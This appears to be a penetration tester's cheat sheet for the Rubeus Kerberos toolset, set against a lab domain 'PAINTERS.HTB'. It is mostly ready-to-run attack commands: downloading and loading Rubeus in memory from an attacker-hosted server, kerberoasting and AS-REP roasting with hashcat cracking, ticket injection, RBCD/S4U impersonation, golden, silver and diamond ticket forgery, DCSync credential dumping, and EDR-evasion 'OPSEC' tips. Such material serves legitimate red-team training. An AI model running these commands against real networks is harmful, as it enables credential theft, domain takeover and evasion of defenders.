---
title: "Rubeus"
description: "Rubeus Kerberos abuse: kerberoast, asreproast, ticket forging, S4U, pass-the-ticket, overpass-the-hash."
category: active-directory
tags: [active-directory, kerberos, tickets]
tools: [Rubeus]
difficulty: advanced
updated: "2026-08-09"
source: "vault:ActiveDirectory/Rubeus.md"
---

# Rubeus

Rubeus is a C# toolset for raw Kerberos interaction and abuse. It talks directly to the Windows Kerberos API and the KDC — it doesn't need admin rights for most operations and doesn't touch LSASS directly (unlike Mimikatz), making it stealthier.

**Core capabilities:**
- Request, harvest, inject, and forge Kerberos tickets
- Kerberoasting, AS-REP Roasting
- Pass-the-Ticket, Overpass-the-Hash
- S4U2Self/S4U2Proxy (RBCD/Delegation abuse)
- Golden/Silver/Diamond ticket creation (needs hashes)

## Getting Rubeus onto a Target

```powershell
# From your attacking machine — host it over HTTP
python3 -m http.server 80

# On target — download it
certutil -urlcache -f http://10.10.14.x/Rubeus.exe Rubeus.exe
iwr -uri http://10.10.14.x/Rubeus.exe -outfile Rubeus.exe

# If you have a shell via Evil-WinRM
upload Rubeus.exe

# Run in memory (avoids dropping to disk) — load .NET assembly
$data = (New-Object Net.WebClient).DownloadData('http://10.10.14.x/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("kerberoast".Split())
```

## Enumeration

```powershell
# List all Kerberos tickets in current session
.\Rubeus.exe klist

# List tickets for ALL users (needs admin)
.\Rubeus.exe klist /all

# Dump all tickets from all sessions (admin required — touches LSASS)
.\Rubeus.exe dump

# Dump tickets for a specific service
.\Rubeus.exe dump /service:krbtgt

# Dump tickets from a specific LUID (logon session ID)
.\Rubeus.exe dump /luid:0x3e7

# Show Kerberos settings / current user info
.\Rubeus.exe currentluid
```

## Harvesting Tickets

Harvest monitors for new 4768 (TGT request) events and captures tickets as users log in — useful for persistence during an engagement.

```powershell
# Monitor and harvest TGTs from all new logons (admin required)
# Captures every TGT as it's issued — waits 30s between checks
.\Rubeus.exe harvest /interval:30

# Save harvested tickets to a directory
.\Rubeus.exe harvest /interval:30 /outdir:C:\tickets\

# Harvest and immediately inject the first ticket found
.\Rubeus.exe harvest /interval:30 /nowrap
```

## Kerberoasting

Request TGS tickets for accounts with SPNs set — the ticket is encrypted with the service account's password hash, which you then crack offline.

```powershell
# Roast ALL accounts with SPNs
.\Rubeus.exe kerberoast

# Output to a file for hashcat/john
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Only roast AES-capable accounts (more realistic, harder to crack)
.\Rubeus.exe kerberoast /aes

# Roast a specific user
.\Rubeus.exe kerberoast /user:svc_sql

# Roast with a specific TGT (if you have one)
.\Rubeus.exe kerberoast /ticket:doIFuD...base64...

# Roast using credentials (useful if you're on Linux or need to specify DC)
# -- Run from a domain-joined machine or with /domain /dc flags --
.\Rubeus.exe kerberoast /creduser:DOMAIN\user /credpassword:Password123

# Force RC4 downgrade via TGT delegation trick (weaker, easier to crack)
.\Rubeus.exe kerberoast /tgtdeleg

# Nowrap — don't wrap long base64 output (easier to copy/paste)
.\Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```

**Crack with hashcat:**
```bash
# Kerberoast (RC4) hashes are mode 13100
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# AES-256 tickets use mode 19700, AES-128 use 19600
hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt
```

## AS-REP Roasting

Targets accounts with "Do not require Kerberos preauthentication" — you can request an AS-REP without knowing the password, and the response contains an encrypted blob crackable offline.

```powershell
# Roast all users without preauth set (needs valid domain user creds to query LDAP)
.\Rubeus.exe asreproast

# Save output for cracking
.\Rubeus.exe asreproast /outfile:asrep_hashes.txt

# Target a specific user
.\Rubeus.exe asreproast /user:jsmith

# Force RC4 (easier to crack)
.\Rubeus.exe asreproast /rc4opsec

# Nowrap for easy copy
.\Rubeus.exe asreproast /outfile:asrep_hashes.txt /nowrap

# From Linux with Impacket (no creds needed if you know usernames)
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip 10.10.11.x -outputfile asrep.txt
```

**Crack with hashcat:**
```bash
# AS-REP hashes are mode 18200
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Requesting TGTs (asktgt)

Ask the KDC directly for a TGT using credentials or hashes.

```powershell
# Request TGT with plaintext password
.\Rubeus.exe asktgt /user:administrator /password:Password123 /domain:PAINTERS.HTB /dc:dc.painters.htb

# Request TGT using NTLM hash (RC4 encryption)
.\Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH_HERE /domain:PAINTERS.HTB /ptt

# Request TGT using AES256 key (stealthier — preferred)
.\Rubeus.exe asktgt /user:administrator /aes256:AES_KEY_HERE /domain:PAINTERS.HTB /ptt

# Request TGT and save as .kirbi file (portable ticket format)
.\Rubeus.exe asktgt /user:svc_sql /rc4:HASH /domain:PAINTERS.HTB /outfile:svc_sql.kirbi

# Request TGT and get base64 blob (easy to copy)
.\Rubeus.exe asktgt /user:svc_sql /rc4:HASH /domain:PAINTERS.HTB /nowrap

# Request TGT and immediately inject (/ptt = pass the ticket)
.\Rubeus.exe asktgt /user:administrator /rc4:HASH /domain:PAINTERS.HTB /dc:dc.painters.htb /ptt
```

## Pass-the-Ticket (PTT)

Take an existing ticket (base64 blob or .kirbi file) and inject it into your current session.

```powershell
# Inject from base64 blob (paste the whole base64 string)
.\Rubeus.exe ptt /ticket:doIFuDCCBbSgAwIBBaED...

# Inject from .kirbi file
.\Rubeus.exe ptt /ticket:administrator.kirbi

# Verify it worked
.\Rubeus.exe klist
klist  # built-in Windows command

# Purge all current Kerberos tickets (clean slate)
.\Rubeus.exe purge

# Purge tickets from a specific LUID
.\Rubeus.exe purge /luid:0x5e73f

# After PTT — test access
dir \\dc.painters.htb\c$
net use \\dc.painters.htb\c$
```

**Workflow with a TGT blob:**
```powershell
# 1. Inject the TGT
.\Rubeus.exe ptt /ticket:doIFuDCCBbSgAwIBBaEDAgEWooIEujCCBLZhgg...

# 2. Ask for a CIFS service ticket (for file shares / PsExec)
.\Rubeus.exe asktgs /ticket:doIFuD... /service:cifs/dc.painters.htb /ptt

# 3. Ask for LDAP ticket (for DCSync)
.\Rubeus.exe asktgs /ticket:doIFuD... /service:ldap/dc.painters.htb /ptt

# 4. Ask for HTTP ticket (for WinRM)
.\Rubeus.exe asktgs /ticket:doIFuD... /service:http/dc.painters.htb /ptt

# 5. Ask for HOST ticket (for PsExec / remote task scheduling)
.\Rubeus.exe asktgs /ticket:doIFuD... /service:host/dc.painters.htb /ptt
```

## Overpass-the-Hash (OPtH)

Convert an NTLM hash into a valid Kerberos TGT — lets you do Kerberos auth instead of NTLM, bypassing NTLM restrictions.

```powershell
# Classic OPtH — inject TGT derived from NTLM hash
.\Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /domain:PAINTERS.HTB /ptt

# Spawn a new process with the ticket injected (doesn't affect current session)
.\Rubeus.exe asktgt /user:administrator /rc4:HASH /domain:PAINTERS.HTB /createnetonly:C:\Windows\System32\cmd.exe

# Use AES256 for OPSEC (no RC4 downgrade logged)
.\Rubeus.exe asktgt /user:administrator /aes256:AES_KEY /domain:PAINTERS.HTB /opsec /ptt
```

## Pass-the-Hash with Rubeus

Rubeus doesn't do traditional PTH (that's Mimikatz territory) but you can chain it:

```powershell
# Step 1: Use the NTLM hash to get a TGT (Overpass-the-Hash)
.\Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /domain:PAINTERS.HTB /nowrap

# Step 2: Inject that TGT
.\Rubeus.exe ptt /ticket:<base64_from_above>

# Step 3: Now use any tool — Kerberos will auth transparently
dir \\dc.painters.htb\c$
```

For pure PTH (SMB, not Kerberos) — use Impacket from Linux instead:
```bash
# Impacket PTH — no ticket needed
psexec.py PAINTERS/Administrator@10.10.11.x -hashes :NTLM_HASH
wmiexec.py PAINTERS/Administrator@10.10.11.x -hashes :NTLM_HASH
smbexec.py PAINTERS/Administrator@10.10.11.x -hashes :NTLM_HASH
```

## Using Tickets with Evil-WinRM

Evil-WinRM supports Kerberos auth but it's easier from Linux using a `.ccache` file.

### Method 1: From Linux with ccache (recommended)

```bash
# Step 1: Get a TGT from Linux using Impacket (outputs .ccache)
getTGT.py PAINTERS.HTB/administrator -hashes :NTLM_HASH
getTGT.py PAINTERS.HTB/administrator -dc-ip 10.10.11.x

# OR convert a .kirbi (Windows format) to .ccache (Linux format)
ticketConverter.py admin.kirbi admin.ccache

# Step 2: Export the ccache as the KRB5CCNAME env variable
export KRB5CCNAME=/path/to/admin.ccache

# Step 3: Add domain to /etc/hosts
echo "10.10.11.x dc.painters.htb painters.htb" >> /etc/hosts

# Step 4: Connect with Evil-WinRM using Kerberos auth (use FQDN, not IP)
evil-winrm -i dc.painters.htb -r PAINTERS.HTB

# Step 5: Verify who you are
whoami
klist
```

### Method 2: Dump from Windows, convert on Kali

```powershell
# Dump the ticket from Windows to a file
.\Rubeus.exe dump /service:http /nowrap
# Copy the base64 output
```

```bash
# Then on Kali: decode and convert
echo "doIFuD...base64..." | base64 -d > admin.kirbi
ticketConverter.py admin.kirbi admin.ccache
export KRB5CCNAME=admin.ccache
evil-winrm -i dc.painters.htb -r PAINTERS.HTB
```

### Evil-WinRM Kerberos config on Kali

```bash
# One-liner to generate /etc/krb5.conf (realm must be UPPERCASE)
cat > /etc/krb5.conf << EOF
[libdefaults]
    default_realm = PAINTERS.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
[realms]
    PAINTERS.HTB = {
        kdc = dc.painters.htb
        admin_server = dc.painters.htb
    }
[domain_realm]
    .painters.htb = PAINTERS.HTB
    painters.htb = PAINTERS.HTB
EOF
```

## Using Tickets with PsExec

PsExec uses SMB (CIFS + IPC$) — you need a CIFS service ticket.

### From Windows (Rubeus PTT → PsExec)

```powershell
# Step 1: Inject TGT
.\Rubeus.exe ptt /ticket:doIFuD...

# Step 2: Request CIFS ticket (or it auto-derives from TGT)
.\Rubeus.exe asktgs /ticket:doIFuD... /service:cifs/dc.painters.htb /ptt

# Step 3: Run PsExec
.\PsExec.exe \\dc.painters.htb cmd.exe
.\PsExec.exe \\dc.painters.htb -s cmd.exe   # -s = SYSTEM context

# Verify in the new session
whoami
hostname
```

### Using Impacket psexec from Linux (more reliable)

```bash
# With NTLM hash directly (PTH)
psexec.py PAINTERS/Administrator@10.10.11.x -hashes :NTLM_HASH

# With Kerberos ticket (ccache)
export KRB5CCNAME=admin.ccache
psexec.py -k -no-pass PAINTERS/Administrator@dc.painters.htb

# With password
psexec.py PAINTERS/Administrator:Password123@10.10.11.x

# Other Impacket exec tools (use same syntax)
wmiexec.py  -k -no-pass PAINTERS/Administrator@dc.painters.htb          # WMI — no service created
smbexec.py  -k -no-pass PAINTERS/Administrator@dc.painters.htb          # SMB — stealthier than psexec
atexec.py   -k -no-pass PAINTERS/Administrator@dc.painters.htb "whoami" # Task scheduler
```

## Using Tickets with Impacket Tools

### Ticket Conversion (kirbi ↔ ccache)

```bash
# Rubeus gives you base64 (.kirbi format internally); Impacket uses .ccache
echo "doIFuDCCBbSgAwIBBaED..." | base64 -d > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=/path/to/ticket.ccache
```

### DCSync with secretsdump.py

```bash
export KRB5CCNAME=admin.ccache
secretsdump.py -k -no-pass PAINTERS/Administrator@dc.painters.htb

# Dump just NTLM hashes
secretsdump.py -k -no-pass -just-dc-ntlm PAINTERS/Administrator@dc.painters.htb

# Dump specific user
secretsdump.py -k -no-pass -just-dc-user krbtgt PAINTERS/Administrator@dc.painters.htb
```

### Full Impacket Kerberos Tool Reference

```bash
# Get TGT (outputs .ccache automatically)
getTGT.py PAINTERS.HTB/user:password
getTGT.py PAINTERS.HTB/user -hashes :NTLM_HASH
export KRB5CCNAME=user.ccache

# Get TGS for specific service
getST.py -spn cifs/dc.painters.htb PAINTERS.HTB/user:password
getST.py -spn cifs/dc.painters.htb -hashes :HASH PAINTERS.HTB/user

# S4U impersonation (RBCD — see S4U section)
getST.py -spn cifs/dc.painters.htb -impersonate Administrator \
  -dc-ip 10.10.11.x PAINTERS.HTB/FAKE-COMP01$:Password123

# Kerberoast from Linux
GetUserSPNs.py PAINTERS.HTB/user:password -dc-ip 10.10.11.x -request
GetUserSPNs.py PAINTERS.HTB/user:password -dc-ip 10.10.11.x -request -outputfile kerberoast.txt

# AS-REP roast from Linux
GetNPUsers.py PAINTERS.HTB/ -usersfile users.txt -dc-ip 10.10.11.x -no-pass -outputfile asrep.txt
GetNPUsers.py PAINTERS.HTB/user:password -dc-ip 10.10.11.x -request  # authenticated
```

> **Note —** Modern Impacket installs (pip/apt) also expose these as `impacket-getTGT`, `impacket-secretsdump`, etc. The `.py` example names still work when installed from source or when the examples are on PATH.

## S4U Attacks (RBCD / Constrained Delegation)

### S4U2Self + S4U2Proxy (Resource-Based Constrained Delegation)

The chain: you own a machine account → configure RBCD → impersonate any user for any service on the target.

**Full attack chain:**
```powershell
# Prerequisites:
# 1. You have GenericWrite/GenericAll on a computer object (or can create machine accounts)
# 2. MachineAccountQuota > 0 (default is 10)

# Step 1: Create a fake computer account (Powermad)
Import-Module Powermad.ps1
New-MachineAccount -MachineAccount NETRUNNER-PC -Password $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)

# Step 2: Get the NTLM hash of the fake computer's password
.\Rubeus.exe hash /password:Passw0rd! /user:NETRUNNER-PC$ /domain:PAINTERS.HTB
# Note the rc4_hmac value

# Step 3: Set RBCD on target — allow our fake PC to delegate
Set-ADComputer -Identity "DC" -PrincipalsAllowedToDelegateToAccount "NETRUNNER-PC$"
# Or using PowerView:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-...NETRUNNER-PC$-SID)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity DC -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Step 4: S4U attack — impersonate Administrator for CIFS on DC
.\Rubeus.exe s4u /user:NETRUNNER-PC$ /rc4:NTLM_HASH_OF_PC \
  /impersonateuser:Administrator \
  /msdsspn:cifs/dc.painters.htb \
  /domain:PAINTERS.HTB \
  /dc:dc.painters.htb \
  /ptt

# Step 5: Use access
dir \\dc.painters.htb\c$
.\PsExec.exe \\dc.painters.htb cmd.exe

# For different services — change /msdsspn:
/msdsspn:ldap/dc.painters.htb    # DCSync
/msdsspn:http/dc.painters.htb    # WinRM
/msdsspn:host/dc.painters.htb    # Task scheduler / WMI
```

**RBCD from Linux (Impacket):**
```bash
# Set RBCD attribute
rbcd.py -f NETRUNNER-PC -t DC -dc-ip 10.10.11.x 'PAINTERS.HTB/user:password'

# S4U attack
getST.py -spn cifs/dc.painters.htb -impersonate Administrator \
  -dc-ip 10.10.11.x 'PAINTERS.HTB/NETRUNNER-PC$:Passw0rd!'

export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass PAINTERS/Administrator@dc.painters.htb
```

## Golden Tickets

Forge a TGT using the **krbtgt** hash. Valid for 10 years by default. Works even if the real user's password changes.

```powershell
# Prerequisites: krbtgt NTLM hash + Domain SID

# Step 1: Get domain SID (all but the last -XXXX of your own SID)
whoami /user

# Step 2: Craft golden ticket (AES256 preferred)
.\Rubeus.exe golden /aes256:KRBTGT_AES256_KEY \
  /user:Administrator \
  /domain:PAINTERS.HTB \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /ptt

# With RC4 (NTLM hash of krbtgt)
.\Rubeus.exe golden /rc4:KRBTGT_NTLM_HASH \
  /user:FakeUser \
  /domain:PAINTERS.HTB \
  /sid:S-1-5-21-... \
  /ptt

# Save to file instead of injecting
.\Rubeus.exe golden /rc4:HASH /user:Administrator /domain:PAINTERS.HTB \
  /sid:S-1-5-21-... /outfile:golden.kirbi

# Verify
klist
dir \\dc.painters.htb\c$
```

**From Linux (Impacket):**
```bash
# ticketer.py creates .ccache golden tickets
ticketer.py -nthash KRBTGT_NTLM -domain-sid S-1-5-21-... \
  -domain PAINTERS.HTB Administrator

export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass PAINTERS/Administrator@dc.painters.htb
```

## Silver Tickets

Forge a TGS for a **specific service** using the **service account's** NTLM hash. More targeted and stealthier than golden (doesn't contact KDC).

```powershell
# Forge a CIFS ticket (file shares, PsExec) using machine account hash
.\Rubeus.exe silver /rc4:MACHINE_ACCOUNT_NTLM \
  /user:Administrator \
  /service:cifs/dc.painters.htb \
  /domain:PAINTERS.HTB \
  /sid:S-1-5-21-... \
  /ptt

# Forge HTTP ticket (WinRM)
.\Rubeus.exe silver /rc4:HASH /user:Administrator \
  /service:http/dc.painters.htb \
  /domain:PAINTERS.HTB /sid:S-1-5-21-... /ptt

# Forge LDAP ticket (DCSync)
.\Rubeus.exe silver /rc4:HASH /user:Administrator \
  /service:ldap/dc.painters.htb \
  /domain:PAINTERS.HTB /sid:S-1-5-21-... /ptt

# Forge MSSQLSvc ticket (SQL Server)
.\Rubeus.exe silver /rc4:HASH /user:Administrator \
  /service:MSSQLSvc/sql.painters.htb:1433 \
  /domain:PAINTERS.HTB /sid:S-1-5-21-... /ptt
```

**Common service names for SPNs:**

| Service | SPN Prefix | Use Case |
|---------|-----------|----------|
| SMB/File | `cifs/` | File access, PsExec |
| WinRM | `http/` | Evil-WinRM, PS Remoting |
| LDAP | `ldap/` | DCSync, LDAP queries |
| WMI | `host/` | WMI execution |
| SQL Server | `MSSQLSvc/` | SQL auth |
| RDP | `TERMSRV/` | RDP access |
| Kerberos (golden) | `krbtgt/` | Get any ticket |

## Diamond Tickets

Newer technique — modifies a real TGT rather than forging from scratch. Much harder for EDR to detect since the PAC is signed by the real KDC.

```powershell
# Requires: krbtgt hash + user creds
.\Rubeus.exe diamond /tgtdeleg \
  /ticketuser:Administrator \
  /ticketuserid:500 \
  /groups:519 \
  /krbkey:KRBTGT_AES256 \
  /domain:PAINTERS.HTB \
  /dc:dc.painters.htb \
  /ptt
```

## Ticket Renewal & Manipulation

```powershell
# Renew a TGT before it expires
.\Rubeus.exe renew /ticket:doIFuD...
.\Rubeus.exe renew /ticket:admin.kirbi /ptt

# Auto-renew every 30 minutes
.\Rubeus.exe renew /ticket:doIFuD... /autorenew

# Describe a ticket (show its contents without cracking)
.\Rubeus.exe describe /ticket:doIFuD...

# Triage — show all tickets across all logon sessions (admin)
.\Rubeus.exe triage

# Convert kirbi to base64 and back
.\Rubeus.exe decode /ticket:doIFuD...
```

## Roasting from Linux (Impacket alternatives)

When you're attacking from Kali and don't have a foothold yet (or don't want to drop Rubeus):

```bash
# Kerberoast — needs valid credentials
GetUserSPNs.py PAINTERS.HTB/user:password -dc-ip 10.10.11.x -request
GetUserSPNs.py PAINTERS.HTB/user -hashes :NTLM -dc-ip 10.10.11.x -request -outputfile kerb.txt

# AS-REP roast — needs username list
GetNPUsers.py PAINTERS.HTB/ -usersfile users.txt -dc-ip 10.10.11.x -no-pass
GetNPUsers.py PAINTERS.HTB/user:password -dc-ip 10.10.11.x -request -outputfile asrep.txt

# Crack
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt   # Kerberoast
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt  # AS-REP
```

## OPSEC Tips

- Use AES256 keys instead of RC4/NTLM — RC4 is flagged by modern EDR (`/aes256:KEY` instead of `/rc4:HASH`).
- Use the `/opsec` flag where available — Rubeus applies stealth measures.
- Use `/createnetonly` to spawn a hidden process with the ticket rather than injecting into your current session (avoids overwriting existing tickets).
- Request tickets from non-DC machines — S4U from a workstation is less suspicious than from the attacker machine directly.
- Use `/enctype:aes256` when requesting service tickets.
- Avoid `/dump` on modern environments — it touches LSASS and will trigger AV. Use `/dump /luid:SPECIFIC_LUID` instead of dumping everything.
- Diamond tickets > Golden tickets for stealth (EDR-evasive).
- Clean up: `.\Rubeus.exe purge` after you're done.

## Common Errors & Fixes

| Error | Cause | Fix |
|-------|-------|-----|
| `KDC_ERR_PREAUTH_FAILED` | Wrong password/hash | Verify credentials/hash |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | User doesn't exist | Check username spelling |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | SPN doesn't exist | Verify SPN with `setspn -L user` |
| `KRB_AP_ERR_SKEW` | Clock skew > 5 min | `net time \\dc /set /yes` or `ntpdate dc.domain.htb` (or `faketime` on Linux) |
| `KRB_AP_ERR_TKT_EXPIRED` | Ticket too old | Request a new TGT |
| `ERROR_ACCESS_DENIED` on PsExec | No admin rights or wrong service ticket | Verify ticket SPN and user group membership |
| Kerberos errors in Evil-WinRM | `/etc/krb5.conf` wrong | Check realm name is UPPERCASE, DNS resolves |
| `No credentials cache found` | KRB5CCNAME not set | `export KRB5CCNAME=/path/to/ticket.ccache` |
| `KRB_AP_ERR_MODIFIED` | Wrong service account hash for silver ticket | Re-extract the correct machine/service account hash |

## Quick Reference Card

```text
HARVEST TICKETS:    Rubeus.exe harvest /interval:30
GET TGT:            Rubeus.exe asktgt /user:X /rc4:HASH /domain:D /ptt
INJECT TICKET:      Rubeus.exe ptt /ticket:BASE64_OR_KIRBI
REQUEST TGS:        Rubeus.exe asktgs /ticket:TGT /service:cifs/HOST /ptt
KERBEROAST:         Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
AS-REP ROAST:       Rubeus.exe asreproast /outfile:hashes.txt /nowrap
LIST TICKETS:       Rubeus.exe klist | klist
DUMP TICKETS:       Rubeus.exe dump /nowrap
DESCRIBE TICKET:    Rubeus.exe describe /ticket:BASE64
S4U ATTACK:         Rubeus.exe s4u /user:PC$ /rc4:HASH /impersonateuser:Admin /msdsspn:cifs/HOST /ptt
GOLDEN TICKET:      Rubeus.exe golden /rc4:KRBTGT_HASH /user:Admin /domain:D /sid:S-1-5-21-... /ptt
SILVER TICKET:      Rubeus.exe silver /rc4:SVC_HASH /user:Admin /service:cifs/HOST /domain:D /sid:S /ptt
PURGE TICKETS:      Rubeus.exe purge

LINUX EVIL-WINRM:   export KRB5CCNAME=ticket.ccache && evil-winrm -i HOST -r REALM
LINUX PSEXEC:       export KRB5CCNAME=ticket.ccache && psexec.py -k -no-pass DOMAIN/user@HOST
LINUX DCSYNC:       export KRB5CCNAME=ticket.ccache && secretsdump.py -k -no-pass DOMAIN/user@HOST
CONVERT TICKET:     ticketConverter.py ticket.kirbi ticket.ccache
```

For use in authorised engagements only.
